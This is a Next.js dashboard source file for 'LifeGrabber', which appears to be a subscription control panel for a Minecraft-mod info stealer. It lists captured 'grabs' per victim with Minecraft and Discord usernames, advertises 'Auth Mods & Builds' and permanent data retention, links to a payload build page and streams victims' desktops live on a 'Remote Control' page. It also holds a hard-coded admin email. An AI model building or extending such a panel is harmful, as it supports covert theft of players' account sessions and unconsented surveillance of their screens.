'use client';

import { useState, useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';

const colors = {
  bg: '#050508',
  panel: '#0d0d12',
  border: '#1a1a22',
  text: '#f0f0f0',
  textDim: '#6b6e7b',
  green: '#22c55e',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', borderRadius: 8,
      background: active ? 'rgba(34, 197, 94, 0.08)' : 'transparent',
      color: active ? colors.green : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
      transition: 'all 0.2s ease',
    }}
    onMouseEnter={e => { if (!active) { e.currentTarget.style.background = 'rgba(255,255,255,0.03)'; e.currentTarget.style.color = colors.text; } }}
    onMouseLeave={e => { if (!active) { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = colors.textDim; } }}
    >
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

function Dashboard({ userEmail }) {
  const [grabCount, setGrabCount] = useState(0);
  const [mcUsername, setMcUsername] = useState('');
  const [mcSaved, setMcSaved] = useState(false);
  const [mcLoading, setMcLoading] = useState(true);

  useEffect(() => {
    if (!userEmail) return;
    const isAdmin = userEmail === 'lifegrading@gmail.com';
    const url = isAdmin ? '/api/grabs' : `/api/grabs?owner_email=${encodeURIComponent(userEmail)}`;
    fetch(url)
      .then(r => r.json())
      .then(d => setGrabCount(d.grabs?.length || 0))
      .catch(() => {});
    fetch(`/api/user/minecraft?email=${encodeURIComponent(userEmail)}`)
      .then(r => r.json())
      .then(d => { if (d.username) { setMcUsername(d.username); setMcSaved(true); } setMcLoading(false); })
      .catch(() => setMcLoading(false));
  }, [userEmail]);

  const handleSaveMc = async () => {
    if (!mcUsername.trim()) return;
    const res = await fetch('/api/user/minecraft', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: userEmail, minecraft_username: mcUsername.trim() }),
    });
    if (res.ok) setMcSaved(true);
  };

  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Good evening.</h1>
      <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4, marginBottom: 24 }}>Your workspace is ready.</p>
      <div style={{ display: 'flex', gap: 14, marginBottom: 24 }}>
        {[
          { icon: '👤', label: 'GRABS', value: String(grabCount), sub: grabCount === 0 ? 'No grabs yet' : `${grabCount} total captures` },
          { icon: '💬', label: 'DISCORD', value: '—', sub: 'Webhook active' },
          { icon: '🌐', label: 'STATUS', value: '✓', sub: 'Online' },
        ].map((c, i) => (
          <div key={i} style={{ background: colors.panel, borderRadius: 10, padding: '18px 20px', flex: 1, border: `1px solid ${colors.border}` }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 6, color: colors.textDim, fontSize: 12, marginBottom: 10 }}>
              <span style={{ fontSize: 14 }}>{c.icon}</span> {c.label}
            </div>
            <div style={{ fontSize: 28, fontWeight: 700, color: colors.text }}>{c.value}</div>
            <div style={{ fontSize: 12, color: colors.textDim, marginTop: 4 }}>{c.sub}</div>
          </div>
        ))}
      </div>
      <div style={{ display: 'flex', gap: 14 }}>
        <div style={{ flex: 1 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
            <span style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase' }}>Recent Captures</span>
          </div>
          <div style={{ height: 200, background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
            <span style={{ fontSize: 28, marginBottom: 8 }}>🔒</span>
            <span style={{ fontSize: 13 }}>{grabCount === 0 ? 'No captures yet' : 'Check Grabs tab'}</span>
          </div>
        </div>
        <div style={{ flex: 1 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
            <span style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase' }}>Link Minecraft</span>
          </div>
          <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: 16 }}>
            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 10 }}>
              Enter your Minecraft username so grabs from your mod are tagged to your account.
            </div>
            {mcSaved ? (
              <div style={{ fontSize: 13, color: colors.green, display: 'flex', alignItems: 'center', gap: 6 }}>
                ✓ Linked to <strong>{mcUsername}</strong>
              </div>
            ) : (
              <div style={{ display: 'flex', gap: 8 }}>
                <input
                  value={mcUsername}
                  onChange={e => setMcUsername(e.target.value)}
                  onKeyDown={e => e.key === 'Enter' && handleSaveMc()}
                  placeholder="Minecraft username"
                  style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 6, padding: '8px 12px', color: colors.text, fontSize: 13, outline: 'none' }}
                />
                <button onClick={handleSaveMc} style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 6, padding: '8px 14px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Link</button>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}



function Plans() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Plans</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Upgrade to unlock more features.</p>
      <div style={{ maxWidth: 400 }}>
        <div style={{ background: colors.panel, border: `1px solid ${colors.green}`, borderRadius: 12, padding: 28, position: 'relative' }}>
          <div style={{ position: 'absolute', top: -10, left: 20, background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '3px 10px', borderRadius: 8 }}>PRO</div>
          <div style={{ fontSize: 12, color: colors.green, letterSpacing: 1, marginBottom: 6, fontWeight: 600 }}>👑 ULTIMATE GRABS</div>
          <div style={{ fontSize: 36, fontWeight: 700, color: colors.text }}>$5</div>
          <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 20 }}>/ month</div>
          {['Unlimited sessions', 'Permanent data retention', 'Webhook notifications', 'Auth Mods & Builds', 'Priority support'].map((f, i) => (
            <div key={i} style={{ fontSize: 13, color: colors.text, marginBottom: 8, display: 'flex', gap: 8 }}>
              <span style={{ color: colors.green }}>✓</span> {f}
            </div>
          ))}
          <button disabled style={{ width: '100%', marginTop: 16, padding: '10px 0', background: colors.green, color: '#000', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, opacity: 0.5, cursor: 'not-allowed' }}>Coming Soon</button>
        </div>
      </div>
    </div>
  );
}

function RepPage({ username, userEmail }) {
  const [reviews, setReviews] = useState([]);
  const [newRep, setNewRep] = useState('');
  const [editingId, setEditingId] = useState(null);
  const [editText, setEditText] = useState('');
  const [menuOpen, setMenuOpen] = useState(null);
  const [filter, setFilter] = useState('Newest');
  const [newTag, setNewTag] = useState('Good');
  const [loading, setLoading] = useState(true);

  const fetchReps = useCallback(async () => {
    try {
      const res = await fetch('/api/reps');
      const data = await res.json();
      setReviews(data.reps || []);
    } catch {}
    setLoading(false);
  }, []);

  useEffect(() => { fetchReps(); }, [fetchReps]);

  const handlePost = async () => {
    if (!newRep.trim() || !userEmail || !username) return;
    const res = await fetch('/api/reps', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_email: userEmail, username, tag: newTag, text: newRep.trim() }),
    });
    if (res.ok) {
      setNewRep('');
      fetchReps();
    }
  };

  const handleDelete = async (id) => {
    await fetch(`/api/reps/${id}?user_email=${encodeURIComponent(userEmail)}`, { method: 'DELETE' });
    setMenuOpen(null);
    fetchReps();
  };

  const handleEdit = (id) => {
    const r = reviews.find(r => r.id === id);
    setEditingId(id);
    setEditText(r.text);
    setMenuOpen(null);
  };

  const handleSaveEdit = async (id) => {
    await fetch(`/api/reps/${id}`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: editText, user_email: userEmail }),
    });
    setEditingId(null);
    setEditText('');
    fetchReps();
  };

  const myRep = reviews.find(r => r.user_email === userEmail);

  const filtered = filter === 'Good' ? reviews.filter(r => r.tag === 'Good') :
    filter === 'Bad' ? reviews.filter(r => r.tag === 'Bad') :
    filter === 'Mine' ? reviews.filter(r => r.user_email === userEmail) :
    filter === 'Oldest' ? [...reviews].reverse() :
    reviews;

  const formatTime = (t) => {
    if (!t) return '';
    const d = new Date(t);
    const now = new Date();
    const diff = Math.floor((now - d) / 1000);
    if (diff < 60) return 'Just now';
    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
    return d.toLocaleDateString();
  };

  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <div style={{ marginBottom: 20 }}>
        <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 4px 0' }}>+Rep</h1>
        <p style={{ color: colors.textDim, fontSize: 14, margin: 0 }}>{reviews.length} reviews from users.</p>
      </div>

      {userEmail ? (
        myRep ? (
          <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: 16, marginBottom: 20 }}>
            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 8 }}>You already posted a rep</div>
            <p style={{ fontSize: 13, color: colors.textDim, margin: 0 }}>You can edit or delete your existing rep below.</p>
          </div>
        ) : (
          <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: 16, marginBottom: 20 }}>
            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 8 }}>Add your rep</div>
            <div style={{ display: 'flex', gap: 8, marginBottom: 10 }}>
              <button onClick={() => setNewTag('Good')} style={{ background: newTag === 'Good' ? colors.green : 'transparent', color: newTag === 'Good' ? '#000' : colors.textDim, border: `1px solid ${newTag === 'Good' ? colors.green : colors.border}`, borderRadius: 6, padding: '6px 14px', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>👍 Good</button>
              <button onClick={() => setNewTag('Bad')} style={{ background: newTag === 'Bad' ? '#ef4444' : 'transparent', color: newTag === 'Bad' ? '#fff' : colors.textDim, border: `1px solid ${newTag === 'Bad' ? '#ef4444' : colors.border}`, borderRadius: 6, padding: '6px 14px', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>👎 Bad</button>
            </div>
            <div style={{ display: 'flex', gap: 8 }}>
              <input
                value={newRep}
                onChange={e => setNewRep(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && handlePost()}
                placeholder="Write a review..."
                style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }}
              />
              <button onClick={handlePost} style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 18px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Confirm</button>
            </div>
          </div>
        )
      ) : (
        <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: 16, marginBottom: 20, textAlign: 'center', color: colors.textDim, fontSize: 13 }}>
          Sign in to leave a review
        </div>
      )}

      <div style={{ display: 'flex', gap: 8, marginBottom: 20 }}>
        {['Newest', 'Oldest', 'Good', 'Bad', 'Mine'].map((f) => (
          <button key={f} onClick={() => setFilter(f)} style={{ background: filter === f ? colors.text : 'transparent', color: filter === f ? colors.bg : colors.textDim, border: 'none', padding: '6px 14px', borderRadius: 6, fontSize: 13, cursor: 'pointer', fontWeight: 500 }}>{f}</button>
        ))}
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
        {filtered.map((r) => (
          <div key={r.id} style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: '16px 20px', position: 'relative' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 6 }}>
              <span style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{r.username}</span>
              <span style={{ background: '#1a2a1a', color: colors.green, fontSize: 11, padding: '2px 8px', borderRadius: 4, fontWeight: 600 }}>👍 {r.tag}</span>
              <span style={{ fontSize: 12, color: colors.textDim, marginLeft: 'auto' }}>{formatTime(r.created_at)}</span>
              {r.user_email === userEmail && (
                <div style={{ position: 'relative' }}>
                  <span onClick={() => setMenuOpen(menuOpen === r.id ? null : r.id)} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 16, padding: '0 4px' }}>⋯</span>
                  {menuOpen === r.id && (
                    <div style={{ position: 'absolute', top: '100%', right: 0, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: 6, zIndex: 10, minWidth: 100 }}>
                      <div onClick={() => handleEdit(r.id)} style={{ padding: '8px 12px', fontSize: 13, color: colors.text, cursor: 'pointer', borderRadius: 4 }}>Edit</div>
                      <div onClick={() => handleDelete(r.id)} style={{ padding: '8px 12px', fontSize: 13, color: '#ef4444', cursor: 'pointer', borderRadius: 4 }}>Delete</div>
                    </div>
                  )}
                </div>
              )}
            </div>
            {editingId === r.id ? (
              <div style={{ display: 'flex', gap: 8 }}>
                <input value={editText} onChange={e => setEditText(e.target.value)} onKeyDown={e => e.key === 'Enter' && handleSaveEdit(r.id)} style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 6, padding: '8px 12px', color: colors.text, fontSize: 14, outline: 'none' }} />
                <button onClick={() => handleSaveEdit(r.id)} style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 6, padding: '8px 14px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Save</button>
              </div>
            ) : (
              <p style={{ fontSize: 14, color: colors.text, margin: 0 }}>{r.text}</p>
            )}
          </div>
        ))}
        {filtered.length === 0 && !loading && (
          <div style={{ textAlign: 'center', color: colors.textDim, fontSize: 13, padding: 40 }}>No reviews yet</div>
        )}
      </div>
    </div>
  );
}

function RemoteControl() {
  const [onlineUsers, setOnlineUsers] = useState([]);
  const [viewingStream, setViewingStream] = useState(null);
  const [streamFrame, setStreamFrame] = useState(null);

  useEffect(() => {
    const iv = setInterval(() => {
      fetch('/api/stream').then(r => r.json()).then(d => setOnlineUsers(d.online || [])).catch(() => {});
    }, 3000);
    return () => clearInterval(iv);
  }, []);

  useEffect(() => {
    if (!viewingStream) { setStreamFrame(null); return; }
    const iv = setInterval(() => {
      fetch('/api/stream?username=' + encodeURIComponent(viewingStream))
        .then(r => r.json())
        .then(d => { if (d.frame) setStreamFrame(d.frame); else { setViewingStream(null); setStreamFrame(null); } })
        .catch(() => {});
    }, 500);
    return () => clearInterval(iv);
  }, [viewingStream]);

  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20 }}>
        <div>
          <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Remote Control</h1>
          <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4 }}>{onlineUsers.length} users online</p>
        </div>
      </div>

      {onlineUsers.length === 0 ? (
        <div style={{ background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 12, height: 300, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
          <span style={{ fontSize: 28, marginBottom: 8 }}>No users online</span>
          <span style={{ fontSize: 13 }}>Users will appear here when they join a server</span>
        </div>
      ) : (
        <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap', marginBottom: 20 }}>
          {onlineUsers.map(u => (
            <div key={u.username} onClick={() => setViewingStream(viewingStream === u.username ? null : u.username)} style={{ cursor: 'pointer', background: viewingStream === u.username ? '#1a2a1a' : colors.panel, border: '1px solid ' + (viewingStream === u.username ? colors.green : colors.border), borderRadius: 10, padding: '12px 16px', display: 'flex', alignItems: 'center', gap: 10, transition: 'all 0.15s' }}>
              <img src={'https://mc-heads.net/avatar/' + u.username + '/32'} alt="" style={{ width: 28, height: 28, borderRadius: 6 }} />
              <div>
                <div style={{ fontSize: 13, fontWeight: 600, color: colors.text }}>{u.username}</div>
                <div style={{ fontSize: 11, color: colors.green }}>Live</div>
              </div>
            </div>
          ))}
        </div>
      )}

      {viewingStream && (
        <div style={{ background: colors.panel, border: '1px solid ' + colors.green, borderRadius: 12, padding: 16 }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 12 }}>
            <div style={{ fontSize: 14, fontWeight: 600, display: 'flex', alignItems: 'center', gap: 8 }}>
              <img src={'https://mc-heads.net/avatar/' + viewingStream + '/24'} alt="" style={{ width: 24, height: 24, borderRadius: 4 }} />
              {viewingStream}&apos;s Desktop
              <span style={{ color: colors.green, fontSize: 11 }}>STREAMING</span>
            </div>
            <div onClick={() => { setViewingStream(null); setStreamFrame(null); }} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 13 }}>Close</div>
          </div>
          {streamFrame ? (
            <img src={streamFrame} alt="Desktop stream" style={{ width: '100%', borderRadius: 8, border: '1px solid ' + colors.border }} />
          ) : (
            <div style={{ height: 300, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim, fontSize: 13 }}>Connecting...</div>
          )}
        </div>
      )}
    </div>
  );
}

function LiveCaptures() {
  const [grabs, setGrabs] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch('/api/grabs/live')
      .then(r => r.json())
      .then(d => { setGrabs(d.grabs || []); setLoading(false); })
      .catch(() => setLoading(false));
    const interval = setInterval(() => {
      fetch('/api/grabs/live').then(r => r.json()).then(d => setGrabs(d.grabs || [])).catch(() => {});
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  const totalCaptures = grabs.reduce((s, g) => s + g.count, 0);

  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <div style={{ marginBottom: 20 }}>
        <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Live Captures</h1>
        <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4 }}>{totalCaptures} captures from {grabs.length} users</p>
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
        {grabs.map(g => (
          <div key={g.minecraft_username} style={{ background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 10, padding: '14px 20px', display: 'flex', alignItems: 'center', gap: 14 }}>
            <img src={'https://mc-heads.net/avatar/' + g.minecraft_username + '/40'} alt="" style={{ width: 40, height: 40, borderRadius: 8 }} />
            <div style={{ flex: 1 }}>
              <div style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{g.minecraft_username}</div>
              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2 }}>{g.discord_username}</div>
            </div>
            <div style={{ textAlign: 'right' }}>
              <div style={{ fontSize: 18, fontWeight: 700, color: colors.green }}>{g.count}</div>
              <div style={{ fontSize: 11, color: colors.textDim }}>captures</div>
            </div>
          </div>
        ))}
        {grabs.length === 0 && !loading && (
          <div style={{ textAlign: 'center', color: colors.textDim, fontSize: 13, padding: 60 }}>No captures yet</div>
        )}
      </div>
    </div>
  );
}

export default function DashboardPage() {
  const [page, setPage] = useState('dashboard');
  const [user, setUser] = useState(null);
  const [isPro, setIsPro] = useState(false);
  const [proChecked, setProChecked] = useState(false);
  const router = useRouter();

  useEffect(() => {
    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => {
        if (d.user) {
          setUser(d.user);
          if (d.user.email === 'lifegrading@gmail.com') {
            setIsPro(true);
            setProChecked(true);
          } else {
            fetch('/api/user/pro')
              .then(r => r.json())
              .then(p => { setIsPro(p.is_pro); setProChecked(true); })
              .catch(() => { setIsPro(false); setProChecked(true); });
          }
        } else {
          setProChecked(true);
        }
      })
      .catch(() => setProChecked(true));
  }, []);

  const username = user?.name || 'You';
  const userEmail = user?.email || '';

  if (!proChecked) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
      </div>
    );
  }

  if (!isPro && userEmail !== 'lifegrading@gmail.com') {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 16 }}>
          <div style={{ fontSize: 48 }}>🔒</div>
          <div style={{ fontSize: 18, fontWeight: 600 }}>Pro Required</div>
          <div style={{ fontSize: 14, color: colors.textDim, textAlign: 'center', maxWidth: 400 }}>
            You need a Pro license to access the dashboard. Contact the admin to get access.
          </div>
          <div onClick={() => window.location.href = '/api/auth/logout'} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 14, marginTop: 8 }}>
            Log out
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 220, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'linear-gradient(180deg, #0a0a10 0%, #050508 100%)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: '#222' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" active={page === 'dashboard'} onClick={() => setPage('dashboard')} />
          <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
          {userEmail === 'lifegrading@gmail.com' && (
            <NavItem icon="👥" label="Admin" onClick={() => router.push('/admin')} />
          )}
          <NavItem icon="📋" label="Plans" active={page === 'plans'} onClick={() => setPage('plans')} />
          <NavItem icon="⭐" label="+Rep" active={page === 'rep'} onClick={() => setPage('rep')} />
          <NavItem icon="📡" label="Live Captures" active={page === 'live'} onClick={() => setPage('live')} />
          <NavItem icon="🖥" label="Remote Control" onClick={() => router.push('/dashboard/remote-control')} />
        </div>
        <div>
          <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>
      {page === 'dashboard' && <Dashboard userEmail={userEmail} />}
      {page === 'plans' && <Plans />}
      {page === 'rep' && <RepPage username={username} userEmail={userEmail} />}
      {page === 'live' && <LiveCaptures />}
    </div>
  );
}
